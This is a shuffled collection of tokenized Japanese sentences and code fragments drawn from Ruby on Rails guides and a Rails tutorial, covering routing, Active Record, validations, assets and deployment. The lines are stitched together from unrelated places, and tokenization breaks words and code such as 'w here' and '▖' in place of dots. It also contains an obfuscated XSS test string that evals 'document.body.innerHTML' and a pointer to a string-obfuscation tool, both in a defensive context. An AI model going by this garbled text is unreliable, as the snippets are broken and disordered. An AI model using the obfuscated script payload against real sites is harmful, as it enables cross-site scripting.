この メソッド は ` Date▖ today ` と 似 て い ま す が 、 ユーザー 定義 の タイム ゾーン が あ る 場合 に それ を 考慮 する 点 が 異な り ま す 。
umerate}╼╼    %  subsection  user_ index  ( end ) ╼╼    \ subsection { サンプル の ユーザー } %  ( fold) ╼    \ label{ sec : sample_users }╼╼
この コンソール は 、 入力 し た それぞれ の 行 を 評価 し た 結果 を 表示 し て お り 、 文字 列 リテラル の 場合 に は 文字 列 自身 が 表示 さ れ ま す 。
class   Author  <  ActiveRecord : : Base
|  HTTP   動詞   |   パス                   |  コントローラ # アクション    |   名前 付き ヘルパー               |
この 関連 付け は ` author ` と い う 名前 な の で 、 `blorgh_ articles ` テーブル に は ` author_ id ` と い う カラム が 追加 さ れ る 必要 が あ り ま す 。
$  git  commit   - a
1 から 31 まで の 日付 を オプション に 持 ち 、 当日 が 選択 さ れ て い る select タグ を 返 し ま す 。
##### `: foreign_key`
    This   is   the   home   page   for   the
数千 の レコード に 対 し て 単に ループ 処理 を 行な う の で あ れ ば 通常 の 検索 メソッド で 十分 で す 。
不 具合 が 発生 し た 場合 は 、 以下 の コマンド を 試 し て み て くださ い 。
`errors [ ] ` は 、 特定 の 属性 に つ い て エラー メッセージ を チェック し た い 場合 に 使用 し ま す 。
use   ActionDispatch : : RemoteIp
javascript_ include_tag  : all ,   cache:  true  # =>
   before_ save   { false  } #  良 い
上 の ジョーク に 倣 え ば 、 この世 に は 10 種類 の 人々 が い ま す ▟ 三 項 演算 子 を 好き な 人 、 嫌い な 人 、 三 項 演算 子 を 知 ら な い 人 で す 。
\ texttt { rails server } を 実行 し た とき の デフォルト の Rails ページ 。
しかし その 前 に 、 削除 を 実行 でき る 権限 を 持 つ 管理 ユーザー の クラス を 作成 し ま しょ う 。
完全 な ファイル を リスト \ ref{ code : layout_new_structure } に 示 し ま す ▟ 続 い て 、 これ を 構成 し て い る 多く の 部品 に つ い て 解説 し ま す 。
デフォルト で は 、 ロケール ファイル に あ る ロケール キー は すべて 有効 に な り ま す が 、 新し い アプリケーション の 場合 、 通常 は ` : en ` だけ で す 。
create    app/views/layouts/mailer▖ text ▖ erb
デフォルト は ` nil ` で す 。
今回 の ケース で は 、 特定 の リンク が 存在 する か どう か を 、 \ kode { a } タグ と \ kode { href } 属性 を オプション で 指定 し て 調べ て い ま す ▟ たとえば
     paintIt( this ,   backgroundColor ,   text Color )
 _ About  your  application's  environment_  リンク を クリック すれ ば 、 アプリケーション 環境 の 概要 を 確認 でき ま す 。
この バリデーション は 、 あらゆる 種類 の 関連 付け に 対 し て 使用 でき ま す 。
上 の 行 は 一種 の セフティ チェック の 役割 も 果たし て お り 、 うっかり \ kode {to_a } メソッド を 付け 忘れ た とき の エラー を すべて キャッチ し て くれ ま す 。
ログ が ある 程度 以上 長 い 場合 は 、 \ kode { q } キー を 押 し て 終了 し ま す 。
Fetching   source   index  for  https://rubygems ▖org /
#   アセット URL の ダイジェスト を 生成 する 。
\ ref{ sec :a_users _ resource } に お い て 、 REST アーキテクチャ は 、 作成 さ れ たり 削除 さ れ たり する \emph { リソース } に 関連 し て い た こと を 思い出 し て くださ い 。
` dasherize ` メソッド は 、 レシーバ の アンダース コア 文字 を ダッシュ に 置き換え ま す ( 訳注 :   ここ で 言 う ダッシュ は 実際 に は 「 ハイフン マイナス 文字 」 ( U + 00 2 D ) で す ) 。
mattr_accessor   : author_ class
上 の 例 で 言 う と " contributor " や " object " で す 。
残念 ながら 、 Rails   4 ▖ 0 で は 技術 的 な 理由 に よ り 以下 の エラー ページ が 表示 さ れ ま す ▟ Rails   4 ▖ 0 の デフォルト ページ は Heroku で は 表示 でき ま せ ん 。
テ スティング サイクル の 最初 の 一 回し に 取りかか る 前 に 、 まず は 現在 の テスト スイート を その まま 実行 し て 、 問題 な く パス する こと を 確認 し て お き ま す 。
\ kode { footer } タグ と \ kode {▖ footer } クラス を 両方 使用 し て い る こと に つ い て 疑問 に 思 う 方 が い る か も しれ ま せ ん 。
*   Active   Record スキーマ に お け る 名前付け ルール
作成 し た コード を リスト \ ref{ code : password _ reset_form } に 示 し ま す
# Uncomment  these  lines  on   Linux ▖
#   与え られ た 文字 列 の ハッシュ 値 を 返 す
d ▖ beginning _ of _week(:sunday )  # =>  Sun ,   0 2   May  2010
### ` in ?
Person ▖ new▖ valid ?   
上 の ルーティング は 、 `/photos ` で 始ま る パス を 認識 し ま す が 、 ルーティング 先 を ` Images ` コントローラ に し ま す 。
パスワード 用 の フィールド を 作成 し ま す ▟ この フィールド へ の 入力 は マスク 用 文字 で 隠 さ れ ま す 。
` rewhere ` メソッド は 、 既存 の w here 条件 を 上書き し ま す 。
リスト \ ref{ code : users _migration } の 場合 、 \ kode { change } メソッド は \ kode { create_table } と い う Rails の メソッド を 呼 び 、 ユーザー を 保存 する ため の テーブル を データベース に 作成 し ま す 。
SanitizeHelper モジュール は 、 望まし く な い HTML 要素 を 除去 する ため の メソッド 群 を 提供 し ま す 。
@customer  = @order ▖ customer
* `bootstrap_hook ` :   この フック は すべて の 設定 済み ` before_ initialize ` ブロック を 実行 し ま す 。
一方 、 Rails は   “ referrer ”   と い う 正し い スペル で 使 っ て い ま す 。
テンプレート 、 パーシャル 、 レイアウト
####  collection_radio_buttons
Article▖ includes(:category ,  : comments )
    options ▖ update (options [ : params ] ▖symbolize_keys)   if  options [ : params ]
" contact_data " ▖ dasherize # => " contact - data "
( システム 環境 に 依存 する 可能 性 の あ る gem は コメント アウト さ れ て い ま す 。
User Mailer ▖welcome(@user ) ▖ deliver_ later
      @ article ▖ update  params [ : article ]
$ bun dle
デフォルト の エラー メッセージ は  _ " must   be  even " _  で す 。
README ▖ md        |      5   +
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ range/conversions ▖rb ` で す 。
### `index_ by `
customer▖ orders▖ size            # orders の キャッシュ コピー が 使用 さ れ る
*  `config ▖ assets▖ compress ` は 、 コンパイル 済み アセット を 圧縮 する か どう か を 指定 する フラグ で す 。
Client ▖ joins(:orders) ▖ w here ( 'orders▖ created_at' => time_range )
Rails アプリケーション を 実際 に Heroku に デプロイ する に は 、 まず Git を 使用 し て Heroku に リポジトリ を プッシュ し ま す 。
この 時点 で 、 ( プロト) フィード と その テスト は すべて 動 く はず で す 。
    #   後 で 行な う
*  `ren der  : plain ` を 実行 する と content type は ` text /plain ` に 設定 さ れ る
    patch  : update_name ,   on :  :member
Active   Record は 、 レコード が 更新 さ れ る たび に ` lock_ version ` カラム の 値 を 1 ずつ 増や し ま す 。
作成 し た コード を リスト \ ref{ code :digest _ method } に 示 し ま す
example ▖ com へ の サイン アップ が 成功 し ま し た ▟ ユーザー 名 は 「 <%= @user▖ login  %> 」 で す 。
` ActiveRecord : : Base▖table_name =` メソッド を 使用 し て 、 使用 す べ き テーブル 名 を 明示 的 に 指定 でき ま す 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/integer/inflections ▖rb ` で す 。
また 次 の よう に し て 、 ミドルウェア を 読み込 み ま す 。
</table>
以下 の HTML を 生成 し て い る こと が わか り ま す 。
" Ruby   on   Rails   Tutorial   Sample  App "
コメント に も あ る よう に 、 上 の コード は まだ 実装 が 完了 し て い ま せ ん の で 注意 し て くださ い ▟ しかし 実装 の 出発 点 と し て は これ で 十分 で す 。
* `ActiveSupport: : Deprecation ▖ silenced ` は 、 非 推奨 警告 メッセージ を 表示 する か どう か を 指定 し ま す 。
破壊 的 な メソッド ( ` save ! ` など ) で は 、 レコード が 無効 な 場合 に 例外 が 発生 し ま す 。
   g ▖ assets false
これ が でき る よう に する ため に は 、 ポリ モー フィック な インターフェイス を 使用 する モデル で 、 外部 キー の カラム と 型 の カラム を 両方 とも 宣言 し て お く 必要 が あ り ま す 。
デフォルト は `: en ` で す 。
% w ( ) ▖ to_sentence                  # => " "
config ▖ assets▖ debug   =  false
  $  spring  stop
[ ] ▖to ( 7 )            # => [ ]
` : layout ` など の 追加 オプション を 渡 す 場合 は 、 ` : partial ` オプション を 明示 的 に 指定 する 必要 が あ る 点 に も ご 注意 くださ い 。
   if  text Color ?
_ ルーティング _  は 、 リクエスト を どの コントローラ に 割り振 る か を 決定 する ため の もの で す 。
この ブロック は 、 レコード と 属性 の 名前 、 そして 属性 の 値 を 受け取 り ま す 。
---------------------------------------
##### `: source `
              POST    /articles ( ▖: format )            articles # create
### `absence `
これ は 、 Rails   4 ▖ x の 新し い ` secret_key_ base ` を 使用 し て 署名 さ れ た cookies に は Rails   3 ▖ x の cookies と の 後方 互換 性 が な い ため で す 。
変更 前 :
     def  prevent_ delivery _ to_ guests
たとえば 、 ユーザー 情報 の メール アドレス が 無効 で 、 パスワード が 短 すぎ る 状態 で 保存 し よ う と し た と し ま す 。
リモート フォーム は ` meta ` タグ から 認証 を 受け取 る の で 、 Java Script の 動作 し な い ブラウザ を サポート し な けれ ば な ら な い の で な けれ ば トークン の 埋め込み は 不要 で す 。
User モデル は 問い合わせ を 受け 、 すべて の ユーザー を データベース から 取り出 す 。
User ▖ active ▖ inactive
例 と し て 、 jQuery ライブラリ を 使用 し て Ajax リクエスト を 送信 する Coffee Script コード を 以下 に 示 し ま す 。
今度 は ` distinct ` を 設定 し て み ま しょ う 。
これ で ユーザー 登録 / サイン イン / サイン アウト が すべて 揃 い ま し た ▟ テスト スイート は パス する はず で す 。
`find_or_create_by ! ` を 使用 する と 、 新し い レコード が 無効 な 場合 に 例外 を 発生 する こと も でき ま す 。
  <% @ articles ▖each   do  | article | %>
この コード は マイクロ ポスト が 有効 で あ り 、 かつ \ kode {user_ id } 属性 が 存在 し て い る こと を テスト し て い ま す 。
User オブジェクト 以外 で も 動作 する よう に error _messages パーシャル を 更新 する  
ユーザー 登録 に 成功 し た 画面 の モックアップ
そう か も しれ ま せ ん 。
ちなみ に 、 \ kode {private } キー ワード 以降 の コード を 強調 する ため に 、 \ kode {user\_ params } の インデント を 1 段 深 く し て あ り ま す 。
   config▖ active_ support▖ test _order   = :sorted # `: random` に し て も よ い
   < h 1 > David   Heinemeier   Hansson </ h 1 >
TIP:   Rails で は 、 エラー メッセージ を 含 む フィールド は 自動 的 に ` field_ with _errors ` クラス を 持 つ div タグ で 囲 ま れ ま す 。
*  `active_ record ▖ log _runtime`: ` ActiveRecord : : Railties: : ControllerRuntime` を インク ルード し ま す ▟ これ は 、 リクエスト で Active   Record 呼び出し に かか っ た 時間 を ロガー に レポート する 役割 を 担 い ま す 。
###   ポリ モー フィック 関連 付け
create      app/assets/stylesheets/welcome▖css ▖ scss
#   gem ' therubyracer ' ,  platforms :  : ruby
                      WHERE   follower_ id   = :user_ id "
名前 から 想像 さ れ る よう に 、 コントローラ の アクション は コントローラ 内 で 定義 し ま す 。
「 エス キューエル 」 と 発音 し ま す が 、 「 スィークゥエル 」 も よく 使 わ れ ま す 。
次 に 、 いつ も の よう に 開発 データベース と テスト データベース を 更新 し ま す 。
####  date_field_tag
Rails 環境 の 設定
範囲 は 、 配列 の 要素 を 取り出 す の に 便利 で す 。
  <%=  f▖ text _field :title %><br>
------
xml   version = " 1 ▖ 0 "   encoding = " UTF - 8 " ?
`errors [ : attribute ] ` を 使用 し て 、 特定 の オブジェクト の 属性 が 有効 で あ る か どう か を 確認 でき ま す 。
*   使用 さ れ て い る HTTP 動詞   ( その ルーティング が すべて の HTTP 動詞 に 応答 する の で な い 場合 )
  # サイン イン し て い な い ユーザー 用 の リンク
petabytes
( \ kode {mkdir } コマンド や GUI ベース の ファイル マネージャ を 使用 し て この ディレクトリ を 作成 する 必要 が あ る こと も あ り ま す ) 。
* `build_association ( attributes = {}) `
Rails 3 ▖ 1 以降 で は 、 静的 ファイル を 目的 別 に 分類 する 、 標準 的 な \emph { 3 つ の } ディレクトリ が 使用 さ れ る よう に な り ま し た ▟ 最新 の Rails で も 同様 で す 。
Guard に Spork を 導入 する
      t ▖integer  : imageable_ id
SELECT  *  FROM   clients   WHERE   ( clients▖ created_at   BETWEEN   '2008 - 12 - 21   0 0 : 0 0 : 0 0 '   AND   '2008 - 12 - 2 2   0 0 : 0 0 : 0 0 ' )
DS _ Store
make_relationships
HAVING  sum ( price )   >   100
*  `config ▖ assets▖ paths ` に は 、 アセット 探索 用 の パス を 指定 し ま す 。
$  rails   generate  scaffold Micropost   content : string   user_ id : integer
ここ で `@user▖ todos▖ create ` を 実行 する と 、 `@todo ` レコード の ` user_ id ` カラム の 値 に は `@user ` の ` guid ` 値 が 設定 さ れ ま す 。
alert ( eval ( ' document▖ body ▖inne '  +  'r HTML ') ) ;
  >>   1 ▖ kilobyte
' DENY ' を 指定 する と すべて の フレーミング が 不 許可 に な り ま す ▟ すべて の Web サイト に つ い て フレーミング を 許可 する に は ' ALLOWALL ' を 指定 し ま す 。
特定 の コントローラ を サポート する ため に 、 アプリケーション の 標準 レイアウト と の 違い が ごく わずか しか な い よう な レイアウト を 使 い た く な る こと が あ り ま す 。
12355 5 1234 ▖ to_s(:phone ,   delimiter : "  " )
更新 を ローカル に 取り込 み ま しょ う 。
def  reformat_ name ( name )
最初 の 行 が 、 その 後 に 定義 さ れ て い る 関数 の 目的 を 説明 し て い る コメント で す 。
\ kode {Microposts Controller } クラス に おけ る 継承 。
最初 の バリデーション で は 、 有効 な 画像 の 種類 を 制限 し て い き ま す が 、 これ は CarrierWave の アップ ローダー の 中 に 既に ヒント が あ り ま す 。
この gem に は ` Rails : : Engine ` から 継承 し た エンジン クラス が 1 つ 含 ま れ て い ま す 。
   validates : order ,  absence :  true
ユーザー 登録 時 の エラー 表示 を 更新 する
テスト に パス する こと を 確認 し て み ま しょ う 。
╼ ╼ If  you  did   not   request   your   password   to   be   reset ,   please  ignore  this  email   and ╼ your   password   will  stay   as  it   is ▖
なお 、 Windows   の コマンドライン で は 、 $ の 代わり に 大 な り 記号   ( \kode {>})   が プロンプト に 表示 さ れ る の で 、 $  を  >   に 置き換え て 読 ん で くださ い 。
         isolate_namespace   Blorgh
これ は 、 REST アーキテクチャ が 2 つ の リソース に 同じ よう に 反映 さ れ て い る こと を 示 し て い ま す 。
Rails の RESTful 構造 を 身体 に 叩きこ む に は 、 繰り返 し 学 ぶ の が 一番 で す ▟ Users リソース と Microposts リソース の 構造 の 類似 点 を 理解 する こと が 、 この 章 の 主要 な 目的 で す 。
####  collection_select
{ 0 } 図 2 ▖ 7 { / 0 }   { 1 } ユーザー 編集 用 の ページ   ( \ href { http://local host : 3000 / users / 1/edit} {/ users / 1/edit} ) { / 1 }
   /Users/mhartl/ rails _projects/sample_app/spec/models/user_ spec ▖ rb
Fast   forward
[ ] ▖ sum ( 1 )   {|n| n * * 3 } # = >   1
ユーザー が パスワード を 設定 でき な い
╼╼    %  subsection   modeling _microposts   ( end ) ╼╼%  section   planning_ the_application   ( end ) ╼╼  \ section {Users リソース } %  ( fold) ╼  \ label{ sec : demo_ users _ resource } ╼╼
CHANGELOG エントリ の 例 を 以下 に 示 し ま す   (  * * 訳注 :   実際 は 英語 で 書 き ま す * * ) 。
Java Script セグメント から 改行   ( CR )   と 一 重 引用 符 と 二 重 引用 符 を エスケープ し ま す 。
\ ref{ sec : sample_app_setup } の 準備 が すべて 完了 し た ら 、 いよいよ サンプル アプリケーション の 開発 に 取りかか り ま しょ う 。
          file :   attachment ,
#     < name > David   Heinemeier   Hansson</ name >
[ remember   me ]   テスト を 改良 する ため の テンプレート  
xml ▖rss ( " version "  =>  " 2 ▖ 0 " ,   " xmlns : dc "  => " http://purl▖org / dc/elements / 1 ▖ 1 / " )   do
レスポンス を 作成 する
Microposts コントローラ の \ kode { create } アクション
パスワード 再 設定 メール の プレビュー   ( HTML バージョン )
テスト 駆動 開発 の 定義 と は 、 アプリケーション を 開発 する とき に \emph { 最初 に } テスト を 作成 し 、 次 に コード を 作成 する こと で す 。
" highrise_production▖ companies " ▖ classify # =>  " Company "
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
      # initialization  code  goes   here
この Web サイト は インタラクティブ 性 に 富 ん だ インターフェイス を 持 っ て い て 、 また 、 正規 表現 の クイック リファレンス も 兼ね備え て い ま す 。
####  特定 の コンポーネント の テスト を 実行 する
送信 に 失敗 し た 場合 は ` ajax: error ` を 使用 し ま す 。
日付 用 の select タグ の セット を 返 し ま す ▟ タグ は 年 ・ 月 ・ 日用 に それぞれ あ り 、 日付 に 関 する 特定 の 属性 に アクセス し て 年 月 日 を 選択 済み の 状態 に し ま す 。
\ kode { README } ファイル の 更新 が 終わ っ た の で 、 Bitbucket に 変更 を プッシュ し て 結果 を 見 て み ま しょ う 。
本 ガイド で は 、 Action   Controller と Action   View に よ る 基本 的 な レイアウト 機能 に つ い て 解説 し ま す 。
Rails に は ` Date ` クラス や ` Time ` クラス と 同様 に 振る舞 う クラス が いく つ か あ り 、 この 手法 を 使用 でき ま す 。
文字 列 の うち 、 ` position ` で 指定 さ れ た 位置 を 終端 と する 部分 文字 列 を 返 し ま す 。
Rails は 、 最善 の 開発 方法 と い う もの を 1 つ に 定め る と い う 、 ある 意味 大胆 な 判断 に 基 い て 設計 さ れ て い ま す 。
  #  サイン イン し て い る ユーザー 用 の リンク
#### email _field
$   gem install  rails
Updating   \ kode {authenticated ? } 
し
` class_eval ` メソッド を 使用 する こと で 、 あらゆる オブジェクト の singleton クラス の コンテキスト で コード を 評価 する こと が でき ま す 。
  $  heroku run  console
` to_time` は オプション で ` :utc` や `: local ` を 引数 に 取 り 、 タイム ゾーン を 指定 する こと が でき ま す 。
マイクロ ポスト が 1 つ も な い の で は 無理 も あ り ま せ ん 。
関連 する ドキュメント を 参照 し 、 以下 の 相違 点 に つ い て も 把握 し て お い て くださ い 。
##### ` beginning _ of_ hour` 、 `end _of_ hour`
create       test/models/blorgh/article_test ▖ rb
マイグレーション を 実行 する に は rake コマンド を 実行 し ま す ▟ マイグレーション を 使用 し て 行 っ た データベース 構成 の 変更 は 、 後 から 取り消 す こと が でき ま す 。
`utc ` メソッド は 、 レシーバ の 日付 時刻 を UTC で 返 し ま す 。
  #  POST   / users ▖json
# =>  Mon ,   09   Aug  2010  
これ は リスト \ ref{ code :micropost _ form } で 使用 さ れ て い ま し た 。
= > [ " foo " ,   " bar " ,   " baz " ,   " quux " ]
はじめ に 、 Toy アプリケーション を どの よう な もの に する の か 、 計画 を 立て ま しょ う 。
上 の よう に 書 け ば 期待 どおり に 値 が 返 さ れ ま す 。
###  Web 上 の リソース
= >  Ctrl - C   to   shutdown server
デフォルト は UTF - 8 で す 。
たとえば 、 ` Articles Controller ` の アクション が 呼び出 さ れ る と 、 Rails は その 名前 から すぐ に 推測 でき る ` ArticleHelper ` を 使用 し よう と し ま す 。
ヘルパー メソッド ` full _messages ` で は 、 属性 名 を メッセージ に 含め る とき に ` humanize ` を 使用 し て い ま す 。
つまり 、 明示 的 な 設定 が 必要 と な る の は 標準 の ルール だけ で は 不足 が あ る 場合 のみ と い う こと で す 。
*   既存 の issue を 解決 する 方法
この 節 で 作成 する ユーザー プロファイル の モックアップ
完了 時 に は この 一時 ファイル は リネーム さ れ ま す ▟ リネーム は 、 POSIX システム の アトミック 操作 に 基 い て 行 わ れ ま す 。
SELECT  *  FROM   articles   WHERE   ` trashed`  =   1   AND   ` trashed`  =   0
この コード は リスト \ ref{ code :user_relationships_association } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
\ kode {title } タグ の 内容 が 以下 の とおり に な っ て い る こと を 確認 し ま す 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ hash/transform_values▖rb ` で す 。
返 さ れ る 文字 列 は 以下 の とおり で す 。
   username :   root
リスト \ ref{ code : generate_user_ model } に あ る \ kode { generate } コマンド の 結果 の ひと つ と し て 、 \emph { マイグレーション } と 呼 ば れ る 新し い ファイル が 生成 さ れ ま す 。
=>  " mhartl@example ▖ net "
12345 ▖ to_s(:human_size)           # = >  12 ▖ 1   KB
アプリケーション の コンテキスト で マイグレーション を 実行 する に は 、 単に ` rake   db : migirate ` を 実行 し ま す 。
-----------------------
プッシュ し た 後 、 マイグレーション が 完了 する まで の 間 、 一時 的 に ステータス が 無効   ( invalid )   に な り ま す の で 、 ご 注意 くださ い 。
以下 の ファイル を 例 に 説明 し ま す 。
File ▖ extname ( filename) )  } ,
作成 し た コード を リスト \ ref{ code : sign_in_success } に 示 し ま す
*   テンプレート 、 パーシャル ( 部分 テンプレート ) 、 レイアウト の 最適 な 利用 法
get  '/:username ',  to :  'users # show '
   g ▖orm   : active_ record
module   ActiveRecord : : Core : : ClassMethods
\ kode{gravatar _ for } ヘルパー を 組み込 ん だ 結果 を リスト \ ref{ code :gravatar _ for _helper } に 示 し ま し た 。
現在 の サンプル アプリケーション に は 、 正規 表現 に よ る 最小 限 の 確認 以外 に 、 メール アドレス を 検証 する 手段 が あ り ま せ ん 。
< a   href = " # "   onclick = " this ▖style▖ backgroundColor = '# 009900 '; this ▖style▖ color = '# FFFFFF '; " > Paint  it  green </a>
self を 省略 し た 結果 を リスト \ ref{ code :relationships_access_control } に 示 し ま す 。
       create      app/views/users/index▖html ▖erb
上 の コード で は 、 \ kode { users } テーブル の \ kode {email } カラム に インデックス を 追加 する ため に \ kode { add_ index } と い う Rails の メソッド を 使 っ て い ま す 。
Rails テンプレート の デフォルト ビュー を 出力 する こと も でき ま す し 、 特定 の テンプレート 、 ファイル 、 イン ライン コード を 指定 し て 出力 し たり 、 何 も 出力 し な い こと も でき ま す 。
ライブラリ モジュール
< script   src='/assets/main▖ js'></ script>
静的 な ファイル や コンパイル 済み アセット は ここ に 置 き ま す 。
出力 さ れ る レスポンス の content type や HTTP ステータス を 指定 する こと も でき ま す 。
* ` ActionDispatch : : ParamsParser ` は 、 リクエスト から パラメータ を 切り出 し て ` params ` に 保存 し ま す 。
具体 的 に は 、 email カラム に データベース の \emph { インデックス } を 作成 し 、 その インデックス が 一意 で あ る こと を 要求 し ま す 。
カスタム CSS 用 の ファイル を 作成 し た ら 、 リスト \ ref{ code :bootstrap_css } の よう に   \ kode {@import } を 使用 し て 、 Bootstrap   ( と それ に 関連 する Sprockets)   を インク ルード し ま す
( マニフェスト ファイル は CSS と Java Script に は 適用 さ れ ま す が 、 画像 ファイル に は 適用 さ れ ま せ ん )   。
####   その 他 の 日付 計算 メソッド
しかし 実際 に は 、 マイクロ ポスト を ユーザー と \emph { 関連 付け る   ( associate) }   必要 が あ り ま す ▟ その ため 、 マイクロ ポスト の 投稿 者 を 記録 する ため の \ kode {user_ id } も 追加 し ま す 。
*  `config ▖ assets▖ debug ` は 、 デバッグ 用 に アセット の 連結 と 圧縮 を やめ る か どう か を 指定 し ま す 。
Order▖select ( " date ( created_at )   as  ordered_date ,   sum ( price )   as   total_price " ) ▖ group ( " date ( created_at ) " )
SELECT   date ( created_at )   as  ordered_date ,   sum ( price )   as   total_price
#   最後 の 引数 が ハッシュ の 場合 、 波 かっこ は 省略 可能 。
{p 0 } で 作成 し た { 2 } example _user▖ rb { / 2 } ファイル は 今後 使用 する こと は あ り ま せ ん の で 、 削除 し て くださ い 。
しかし 下 の コード は 動作 し ま せ ん ▟ ` Supplier ` クラス と ` Account ` クラス が 異な る スコープ 内 で 定義 さ れ て い る ため で す 。
< li >`:arguments` - sendmail に 渡 す コマンドライン 引数 を 指定 する 。
     name  =  '% s  ( %▖ 1 fms ) ' %  [ name  || ' SQL ',  ms ]
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/marshal ▖ rb ` で す 。
\ kode { Application Controller } クラス に おけ る 継承 。
\ kode {debug } メソッド を 使 う こと で 、 役立 つ デバッグ 情報 を 表示 でき る
1 つ の マイクロ ポスト は 1人 の ユーザー に のみ 属 する 。
\ ref{ sec : layouts } で 学 ん だ よう に 、 \ kode {yield } メソッド は Web サイト の レイアウト に ページ ごと の 内容 を 挿入 し ま す 。
この 手法 を 使用 する こと で 、 たとえば ニュースレター の 読者 を 言語 ごと に   _ グループ 化 _  する こと が でき ま す 。
-------------------------------
attr_accessor   : author_ name
しかし 、 UTF - 8 で 保存 さ れ て い な い 外部 データ が あ る と 、 Rails に よ る 自動 検出 / 修正 が 効 か ず に 文字 化け が 発生 する こと が あ り ま す 。
その まま 実際 に フッター を 表示 し て み る と どう に も 見苦し い の で 、 リスト \ ref{ code : footer_css } で スタイル を 若干 追加 し ま しょ う 。
この オプション を 有効 に する に は 以下 を 設定 し ま す 。
そう で な い と 、 ページ キャッシュ が 有効 に な ら ず 、 public ディレクトリ 以下 に 常駐 する 静的 ファイル へ の リクエスト が 毎回 Rails アプリケーション を 経由 し て しま い ま す 。
     attr_ internal   : captures
この ファイル に は アプリケーション の 設定 方法 など を 記入 し 、 これ さえ 読 め ば 誰 で も アプリケーション を 構築 でき る よう に し て お く 必要 が あ り ま す 。
#### `as ` と `object ` オプション
ここ で 、 すべて の テスト が   \ passing   で あ る こと を 確認 し て お い て くださ い 。
まず は 、 埋め込 み Ruby が 使 わ れ て い る \ kode { form _ for } から \ kode {end } まで の 外側 の 構造 を 読み 解 い て い き ま す 。
この 節 で 扱 わ れ て い る 内容 は 、 本書 の 中 で も 最も 高度 な もの で す 。
Active   Record モデル へ の クエリ に つ い て は [ Active   Record クエリ インターフェイス ] ( active_ record _querying ▖ html ) ガイド で 詳細 を 説明 し ま す 。
*  `engines_blank_ point ` :   エンジン の 読み込 み が 完了 する 前 に 行 い た い 処理 が あ る 場合 に 使用 でき る 初期 化 ポイント へ の フック を 提供 し ま す 。
TIP:   コレクション に よ っ て 呼び出 さ れ る パーシャル 内 で カウンタ 変数 を 使用 する こと も でき ま す ▟ この カウンタ 変数 は 、 コレクション 名 の 後ろ に `_ counter ` を 追加 し た 名前 に な り ま す 。
( 1 ▖ ▖ 10 )   = = =   ( 0 ▖ ▖ 7 )    # => false
invoke     erb  
*  `config▖ cache_classes ` は 、 アプリケーション の クラス や モジュール を リクエスト ごと に 再 読み込 み する か ( = キャッシュ し な い か どう か ) どう か を 指定 し ま す 。
( もし bcrypt   gem を 追加 し て から まだ 一 度 も Rails サーバ を 再 起動 さ せ て い な い 場合 は 、 ここ で 再 起動 し て くださ い ▟ )
###  Read
self を 省略 し た 結果 を リスト \ ref{ code : capybara_dsl } に 示 し ま す 。
   belongs_to  : customer ,   counter_cache:  true
##### `prev_ year ` 、 ` next _ year `
統計 情報 パーシャル の モックアップ
TIP:   イニシャライザ の 実行 順序 を 指定 し た い 場合 は 、 イニシャライザ の ファイル 名 を 使用 し て 実行 順序 を 制御 でき ま す 。
ユーザー 用 の マイ グレーション と 異な り 、 メール アドレス の 一意 性 の マイ グレーション は 未 定義 に な っ て い ま す ▟ リスト \ ref{ code :email_uniqueness_ index } の よう に 定義 を 記述 する 必要 が あ り ま す
[ Hackvertor ] (https://hackvertor▖ co▖uk/public ) は 文字 列 の 難読 化 と エンコード を 行な う 優れ た ツール で あ り 、 「 敵 を 知 る 」 の に 最適 で す 。
*  `ensure_autoload _once_ paths_as_ subset `: `config▖ autoload _once_ paths` に 、 ` config▖ autoload _ paths ` 以外 の パス が 含 ま れ な い よう に し ま す 。
最大 の 違い は 、 ユーザー 登録 は 誰 で も 実行 でき ま す が 、 ユーザー 情報 を 更新 でき る の は その ユーザー 自身 に 限 ら れ る と い う こと で す 。
*  `config ▖reload_ classes_only _ on_change ` は 、 監視 し て い る ファイル が 変更 さ れ た 場合 に のみ クラス を 再 読み込 み する か どう か を 指定 し ま す 。
 * and   you  think  this  stuff   is   worth it ,   you  can buy   me a   beer   in   return▖
class   ReadOnlyModel <  ActiveRecord : : Base
上 の コード は 、 \ kode { input } タグ に 正し い 名前 、 type =" hidden " 、 メール アドレス が あ る か どう か を 確認 し ま す 。
    * `: port` -   使用 する メール サーバー の ポート が 25 番 で な い の で あ れ ば ( めった に な い と 思 い ま す が ) 、 ここ で 対応 でき ま す 。
この 節 で は 、 cookies を 使用 する 一時 セッション で ユーザー を ログ イン でき る よう に し ま す ▟ この cookies は 、 ブラウザ を 閉じ る と 自動 的 に 有効 期限 が 切れ る もの を 使用 し ま す 。
[ Settings ]   リンク を 追加 する 。
たとえば 、 以下 の コード で は 、
user  =  User ▖ create ( name :  " David " ,  occupation :  " Code   Artist " )
self を 省略 し た 結果 を リスト \ ref{ code : layout_ signin_signout_links } に 示 し ま す 。
###  メソッド の 再 定義
config▖ mid dleware ▖ use   Magical : :Unicorns
ここ で 重要 な の は 、 ハッシュ の 波 かっこ は 、 ブロック の 波 かっこ と は まったく 別物 で あ る と い う 点 で す
その よう な 名前 を 関連 付け に 使用 する と 、 基底 メソッド が 上書き さ れ て 不 具合 が 生じ る 可能 性 が あ り ま す 。
` parent ` メソッド は 、 名前 が ネスト し た モジュール に 対 し て 実行 でき 、 対応 する 定数 を 持 つ モジュール を 返 し ま す 。
    too_ short: " %{ count } 語 以上 必要 で す " ,
$  git   rebase   upstream /master
Searched in :   *
この メソッド は 、 パス を Ruby の クラス に 変換 する とき に も よく 使用 さ れ ま す ▟ スラッシュ で 区切 ら れ て い る パス は 「 : : 」 で 区切 ら れ ま す 。
今 は まだ この 解説 が 少し 抽象 的 に 思え る か も しれ ま せ ん が 、 この 章 は 後 に 何 度 も 参照 する 事 に な る の で ご 安心 くださ い 。
$  git   fetch   upstream
    Hash▖ new ( mid dlewares )
明らか に 、 従来 の 書 き 方 より も 洗練 さ れ て い ま す ▟ しかし これ は ほんの さわり で す 。
|   PRI MARY  |   4         |  const  |      1   |       |
この 場合 、 ` PATCH ` リクエスト も ` / users/:id ` 経由 で ` update ` アクション に ルーティング さ れ ま す 。
最後 に 、 Ruby が 以下 の よう な コード を 正常 に 実行 でき て い る の が 不思議 で す 。
